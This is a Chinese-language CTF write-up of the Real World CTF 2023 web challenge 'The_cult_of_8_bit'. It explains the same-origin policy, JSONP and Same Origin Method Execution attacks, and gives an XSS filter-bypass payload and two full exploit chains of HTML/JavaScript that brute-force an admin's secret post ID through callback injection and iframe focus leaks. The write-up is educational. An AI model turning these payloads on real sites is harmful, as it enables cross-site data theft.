# [原创]Realworld CTF 2023 The_cult_of_8_bit详解

> 原文: https://www.ctfiot.com/91479.html
> ID: 91479

前言

很难的题，

这题要用到的一些知识点

同源策略

jsonp

Same Orign Method Execution （同源方法执行）

浏览器的opener 对象

iframe

XHR

特征策略

提前要了解的一些东西

关于同源策略

同源策略具体可以参见文档

https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy

这里主要介绍下 跨源脚本 API 访问

Window

允许以下对 Window 属性的跨源访问：

方法

window.blur

window.close

window.focus

window.postMessage

属性

window.closed

只读。

window.frames

只读。

window.length

只读。

window.location

读/写。

window.opener

只读。

window.parent

只读。

window.self

只读。

window.top

只读。

window.window

只读。

某些浏览器允许访问除上述外更多的属性。

Location

允许以下对 Location 属性的跨源访问：

方法

location.replace

属性

HTMLAnchorElement.href

只写。

某些浏览器允许访问除上述外更多的属性。

window 对象表示的就是当前页面，字面意思，是 “根”

可以发现 window 对象的 opener top location frames focus() 等关键属性和方法我们都是可以跨域访问的，这就为我们后面解题提供了依据。

注意：像上面的那些属性和方法都是 window对象下的，意味着他们都是全局属性或全局方法，即可以类似这样直接访问，不需要使用 window. 来操作

1

2

3

4

5

6

7

//将window.location赋值为http://example.com，即重定向跳转到http://example.com

location = "http://example.com";

//获取到当前页面中name为test的iframe对象

let testIframe = window['test'];

//或

let testIframe = window.frames[0];//获取第0个iframe

对于上面的 opener 属性也很有趣，它指向当前窗口的打开者。

即 A 页面使用 open 方法打开了 B 页面，那么 B 页面的 opener 就指向了 A 页面的 window

注意：opener指向的是页面窗口，也就是说你页面的URL再怎么变，opener是不变的

同样，对于 opener 对象内容的访问也要遵循同源策略

关于jsonp

jsonp的出现是为了解决一些前端的跨域问题。现浏览器一般情况下都要遵循同源策略，所以跨域传输数据就会比较麻烦，所以出现了jsonp这种东西，相关文档参考 https://zhuanlan.zhihu.com/p/24390509

简单来说下，就是像<script> 标签是支持跨域的，所以利用 <script> 标签来跨域获取到要执行的方法和参数，前端将获取到的方法和参数添加到 html 的 script 标签中从而解决跨域问题。而这里要说的题就是利用jsop跨域来进行 Same Orign Method Execution Attack （同源方法执行攻击）

SOME（Same Orign Method Execution）同源方法执行

这里大力推荐这篇论文，讲的非常详细

https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf

这里大致说一下是怎么个回事

比如我前端要跨域获取一些数据，于是我前端可以这样写

http://example.com/

1

2

3

4

5

6

7

8

9

10

11

12

13

14

<html>

<body>

<a href="javascript:alert('hack')">hack</a>

<script>

function load_data(data) {

console.log(data['data']);

}

let callback = new URLSearchParams(window.location.search).get('callback');

let script = document.createElement("script");

script.src = "http://otherSite.com/endpoint?callback=" + callback;

document.head.appendChild(script);

</script>

</body>

</html>

我们访问 http://example.com/?callback=load_data

后端 http://otherSite.com/endpoint?callback=load_data 访问返回了这样的数据

1

load_data({"data":"data"})

那么利用jsonp在 http://example.com/ 成功跨获取到了 http://otherSite.com/ 这个域的数据，并执行 load_data 方法在控制台打印出结果。但如果我们把 callback 的参数改成其他方法，不就可以在前端执行一些方法了吗，虽然一般返回的方法内有参数，但像类似 点击、表单提交、表单输入值篡改等JavaScript 函数，（例如 element.click()、privateForm.submit()、inputElement.stepUp/stepDown()、element.select()、element.focus ()、JsDefinedFunction()、jQueryFunc()等，这些方法给他参数他也能正常执行。

像上面的例子，我们如果发送这样的url

http://example.com/?callback=document.body.firstChild.click

那么就会发现成功点击了 <a> 标签从而弹窗 “hack”

XHR

用法不过多做介绍，这里附上参考文档

https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest

这里说一些比较少见东西，就是在什么情况下会其 open 方法会报错，发现主要有以下几种情况

传递给第一个参数 (请求方法) 的值不是有效的 HTTP 方法（例如 “GET”, “POST” 等）。

传递给第二个参数 (请求 URL) 的值不是有效的 URL。

传递给第三个参数 (是否异步) 的值不是一个布尔值。

使用了特征策略 sync-xhr 'none' 禁止了xhr api

关于上面第二条不是有效的 URL 可能有以下几种情况：

不符合 URL 格式，例如缺少协议部分 (http:// 或 https://) 或者域名部分。

使用非法字符

使用不正确的编码，例如使用百分号编码的字符不符合 UTF-8 格式。

使用无效的端口号，例如端口号小于 0 或大于 65535。

例：

1

2

3

4

5

6

7

8

9

10

11

12

13

14

// 使用非法字符如中间加入空格，%00等

let xhr = new XMLHttpRequest();

xhr.open("GET", "https://www.ex ample.com");

xhr.send()//在send时报错

// 使用不正确的编码

let xhr = new XMLHttpRequest();

xhr.open("GET", "https://www.example.com/%00");//在open时就会报错

xhr.send()

// 使用无效的端口号

let xhr = new XMLHttpRequest();

xhr.open("GET", "https://www.example.com:70000");//在open时就会报错

xhr.send()

iframe与特征策略

iframe参考文档

https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe

有关iframe的一些黑魔法

https://blog.huli.tw/2022/04/07/iframe-and-window-open/

iframe 就是新开了一个页面，iframe的父子窗口之间使用js交互同样必须遵循 同源策略，若想跨域操作可以用 postMessage

iframe有个 allow 属性，用于为<iframe>指定其 特征策略 ，所以我们完全可以限制iframe页面的一些功能，像可以禁掉其中的一些api，比如 xhr。

题目分析

尝试csrf（失败的方案）

好了，说了这么多终于要回到正题了。

题目给了源码，是一个简单的 expressjs 笔记存储服务，源码很长，需要慢慢审。这里说下关键的地方

首先xssbot是以admin登录后访问我们给的url，没啥好说的。

后端有这么几个路由

1

2

3

4

5

6

app.get("/login/", mw.requiresNoLogin, (req, res) => res.render("login"));

app.get("/register/", mw.requiresNoLogin, (req, res) => res.render("register"));

app.get("/report/", mw.requiresLogin, (req, res) => res.render("report"));

app.get("/post/", (req, res) => res.render("post"));

app.get("/", (req, res) => res.render("home"));

可以发现 / 和/post/ 者两个页面没有校验 csrftoken和登录情况。

db.js 中

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

(() => {

let flagId = crypto.randomUUID();

console.log(`flag post ID: ${flagId}`);

posts.set(flagId, {

name: "Flag",

body: process.env.FLAG || "flag{test_flag}"

});

users.set("admin", Object.freeze({

user: "admin",

pass: sha256(process.env.ADMIN_PASSWORD || "password"),

posts: Object.freeze([flagId]),

todos: Object.freeze([])

}));

flag对应着post id

所以只要我们知道对应的post id就可以通过 /post/ 路由不用登录直接拿到flag。

同时在 /create/post 路由中

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

router.post("/create/todo", [mw.csrfProtection, mw.requiresLogin], (req, res) => {

let { text } = req.body;

if (!text) {

return res.redirect("/?msg=Missing text");

}

if (typeof text !== "string") {

return res.redirect("/?msg=Missing text");

}

let isURL = false;

try {

new URL(text); // errors if not valid URL

isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no

} catch {}

req.user.todos.push({

text, isURL

});

res.redirect("/");

});

可以看到对传来的text进行了过滤，拦截了以 javascript: 开头的 text

这里对应前端 home.ejs

1

2

3

4

5

6

7

<%_ user.todos.forEach(todo => { _%>

<%_ if (todo.isURL) { _%>

<li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>

<%_ } else { _%>

<li class="has-text-left"><%= todo.text %></li>

<%_ } _%>

<%_ }); _%>

这里的绕过也很容易，给出这样的payload即可绕过

1

http://a? onfocus=alert(123) id=x

new URL("http://a? onfocus=alert(123) id=x") 不会报错

之后访问 http://localhost:12345/#x 获取到id为x的焦点事件即可xss

但是，注意，这个点在这题并用不上。

首先题目使用了csrftoken，所以没法直接利用CSRF让xssbot向/api/create/todo 发送对应的xss payload来达到目的，其次还有重要的一点是这里

1

2

3

4

5

6

7

// Don't allow admin to make new posts / todos

router.use((req, res, next) => {

if (req.user.user === "admin")  {

return res.redirect("/?msg=Nice try");

}

next();

});

直接限制死了admin不可能向 /api/create/post 和 /api/create/todo 发送数据。

所以走csrf这条路是不行了。

利用 SOEM ATTACK 窃取post id

注意前端 post.ejs

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

window.onload = function() {

const id = new URLSearchParams(window.location.search).get('id');

if (!id) {

return;

}

// Load post from POST_SERVER

// Since POST_SERVER might be a different origin, this also supports loading data through JSONP

const request = new XMLHttpRequest();

try {

request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);

request.send(null);

}

catch (err) { // POST_SERVER is on another origin, so let's use JSONP

let script = document.createElement("script");

script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;

document.head.appendChild(script);

return;

}

load_post(JSON.parse(request.responseText));

}

这里可以发现，如果 try 捕获到了异常，就会使用 jsonp 技术来获取post相关信息。

后端处理

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

router.get("/post/:id", (req, res) => {

let { id } = req.params;

if (!id || typeof id !== "string") {

return res.jsonp({

success: false,

error: "Missing id"

});

}

if (!db.posts.has(id)) {

return res.jsonp({

success: false,

error: "No post found with that id"

});

}

let post = db.posts.get(id);

return res.jsonp({

success: true,

name: post.name,

body: post.body

});

});

但前端 post.ejs 中的 POST_SERVER 定死了，我们没法去修改它。

所以可以考虑从查询参数 id 中入手，想办法让我们随心修改 callback 参数从而实现 SOME 攻击。

这里解决的点有两个

让 open 或 send 方法出错从而让我们可以使用jsonp

要截获 url 查询参数中的 callback 参数

解决这两个点有两种不同的方案

方案一

思路来自 https://sh1yo.art/ctf/thecultof8bit/

上文说过，我们可以利用 %00 来让 open 方法报错

像这样的链接

1

http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00

这个链接经过

1

const id = new URLSearchParams(window.location.search).get('id');

提取得到

1

22121be0-5a1f-4cd7-be2d-be073a0cac22\x00

最终经过 encodeURIComponent(id) 方法进行url编码后再拼接就成了

1

/api/post/22121be0-5a1f-4cd7-be2d-be073a0cac22%00

这个url放到 open 方法中正好是会报错的，解决了第一个点。

对于第二个点可以这样构造

1

http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00

不过多解释了，看图就明白了

这样我们就可以随便控制 callback 参数来实现 SOME 攻击了。

方案二

思路来自 https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit

这个思路也很巧妙

上文也说过，iframe可以通过 allow属性来设置一些特征策略，其中包括了 sync-xhr策略，可以在iframe中加载

1

http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23

同时设置其 allow="sync-xhr 'none'" 来禁用 xhr，使得try捕获异常从而跳转使用jsonp访问

这里截获 callback 参数同上，原理是一样的。

test2.html

1

2

3

4

5

6

7

8

9

10

<html>

<body>

<script>

var iframe = document.createElement('iframe');

iframe.src = "http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23";

iframe.allow = "sync-xhr 'none'";

document.body.appendChild(iframe);

</script>

</body>

</html>

上面两个方案之后的操作都是配合 SOME 攻击，利用 focus 事件 + iframe来逐位爆破post id。详细见下文题解。

题解

下文用到的知识点是SOME ATTACK，强烈建议先看论文 https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf

方案一

紧接着上文方案一，我们创建4个html文件

注意location虽然变了，但opener是不变的

a.html

1

2

3

4

<script>

open("/b.html");//打开b.html

location="http://localhost:12345/";//重定向到admin的主页面（含有post id）

</script>

a.html负责打开 /b.html 和将自身页面重定向到 http://localhost:12345/

b.html

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

<a id="default" href="#">default</a><!--默认聚焦点-->

<script>

//生成对应的iframe

//post id是uuid，范围是 0-9 a-f 和 -

var charList = "0123456789abcdef-";//注意把数字放前面，应为window['4']和window[4]是一样的

var resId = "";

charList.split('').forEach(name => createIframe(name));

function createIframe(name) {

let tmpIframe = document.createElement('iframe');

tmpIframe.name = name;//为iframe设置name属性

document.body.appendChild(tmpIframe);

}

//监听焦点变化

function listenFocus() {

let activeFocusName = document.activeElement.name;

if(activeFocusName) {//若监听到iframe焦点

resId += activeFocusName;

document.getElementById("default").focus();//初始化焦点

fetch(`/res/${resId}`);

}

}

setInterval(listenFocus, 100);

open("/c.html");

</script>

b.html 负责创建 0123456789abcdef- 每个字符的iframe页面，同时创建焦点监听器监听焦点情况，如果监听到某个iframe的焦点则发送该iframe的name。之后打开 /c.html。注意 b.html 的 opener 指向 a页面(http://localhost:12345/)

c.html

1

2

3

4

5

<script>

open("/d.html");

//执行回调函数的页面

location="http://localhost:12345/"

</script>

c.html页面的 location受 d.html 页面控制，是个自由页面，用于执行SOME攻击。注意c.html 的 opener 指向 b.html

d.html

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

<script>

const selfPostId = "6202f8a2-463d-4754-9675-eecde65b619c";//自己页面随便给个postid

var host = "http://localhost:12345";

async function sleep(ms) {

return new Promise(resolve => setTimeout(resolve, ms));

}

async function main() {

for(let i = 0; i < 36; i++) {

let payload =`opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;

opener.location = `${host}/post/?id=${selfPostId}?callback=${payload}%23%00`;

await sleep(200);//时间根据情况调整

}

}

setTimeout(main, 500);//等待所有页面加载完整后启动主程序

</script>

注意 d.html 的 opener 指向 c页面。该页面的为主启动页面，利用多级opener，结合SOME攻击和focus事件逐位爆破a页面的post id。

4个页面放服务器上，之后向xss bot发送 http://192.168.1.3:8000/a.html 爆破即可

方案二

接上文题目分析的方案二

需要两个页面

index.html

1

2

3

4

<script>

open('/exp.html');

location = 'http://localhost:12345/';

</script>

exp.html

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

<a id="default" href="#">default</a>

<script>

async function sleep(ms) {

return new Promise(resolve => setTimeout(resolve, ms));

}

const selfId = "0780dd9c-e326-4786-ad80-e0e9d032cb4a";//自己给个存在的post id

const host = "http://localhost:12345";//题目地址

const charList = "0123456789abcdef-";

var resId = "";

function createCharIframe(name) {

var tmpIframe = document.createElement('iframe');

tmpIframe.name = name;

document.body.appendChild(tmpIframe);

}

charList.split('').forEach(name => createCharIframe(name));

(function createChallengeIframe() {

var challengeIframe = document.createElement('iframe');

challengeIframe.name = "challenge";

challengeIframe.src = host;

challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr

document.body.appendChild(challengeIframe);

})();

async function exploit() {

var challenge = window['challenge'];

for(let i = 0; i < 36; i++) {

//payload

let payload =`top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;

challenge.location = `${host}/post/?id=${selfId}%3Fcallback=${payload}%23`;

await sleep(200);//时间根据情况调整

}

}

//监听焦点变化

function listenFocus() {

var activeFocusName = document.activeElement.name;

if(activeFocusName) {//若监听到iframe焦点

resId += activeFocusName;

document.getElementById("default").focus();//初始化焦点

fetch(`/res/${resId}`);

}

}

setInterval(listenFocus, 100);

sleep(2000);

exploit();

</script>

同样是利用 SOME ATTACK 和iframe的focus事件来爆破post id。

上述两个方案的题解中有关同源策略的问题可以自己体会体会。

参考链接

https://sh1yo.art/ctf/thecultof8bit/

https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit

https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf

https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Permissions_Policy

https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener

https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe

https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest

原文始发于pank1s：[原创]Realworld CTF 2023 The_cult_of_8_bit详解

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50e0f45946.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50e413c4b1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50e6098770.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50e74dfd01.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50ebb5a5c5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/img_63c50ea5d08ea.png)